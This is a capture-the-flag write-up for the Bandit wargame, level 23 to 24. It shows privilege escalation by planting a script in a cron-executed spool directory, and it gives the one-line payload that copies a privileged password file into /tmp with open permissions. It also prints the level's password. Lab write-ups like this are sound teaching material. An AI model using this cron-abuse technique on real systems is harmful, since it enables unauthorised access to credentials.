## Bandit Level 23 → Level 24

### 🎯 Objective
Log in to the Bandit game as bandit23 and obtain the password for the next level by exploiting a cron job that executes user-supplied scripts.

---

### 🔑 Credentials Provided
Username: bandit23  
Password: Obtained from previous level  

---

### 🔍 Method of Solve
A cron job runs as bandit24 and executes every file placed inside `/var/spool/bandit24/foo`.  
By placing a shell script in this directory that copies the password to a readable location, the password for bandit24 can be retrieved.

---

### 🧪 Commands Used
- cd /etc/cron.d  
- ls  
- cat cronjob_bandit24  
- cat /usr/bin/cronjob_bandit24.sh  
- echo 'cat /etc/bandit_pass/bandit24 > /tmp/...ak.txt; chmod 777 /tmp/...ak.txt' > /var/spool/bandit24/foo/ak.sh  
- chmod +x /var/spool/bandit24/foo/ak.sh  
- cat /tmp/...ak.txt  

---

### 📸 Screenshots

**Step 1 – Cronjob Configuration & Script**  

![Bandit Level 23 – Cronjob](screenshots/level23_1.png)

---

**Step 2 – Payload Execution & Password Retrieval**  

![Bandit Level 23 – Password](screenshots/level23_2.png)

---

### 🔑 Next Level Password
gb8KRRCsZhuZXIOtUuR6yp0FjiZbF3G8

---

### 🧠 Explanation
The cron job `cronjob_bandit24.sh` runs every minute and executes all files inside `/var/spool/bandit24/foo`.  
Since bandit23 has write access to this directory, a malicious script can be placed there.

The injected script copies `/etc/bandit_pass/bandit24` into `/tmp/...ak.txt` and changes its permissions so it can be read.  
Once the cron job runs, the password is written to this file, which can then be displayed using `cat`.

---

### 🔐 Concept Learned
This level demonstrates **cron job abuse and privilege escalation**.  
It shows how insecure execution directories in scheduled jobs can allow attackers to run commands as higher-privileged users.
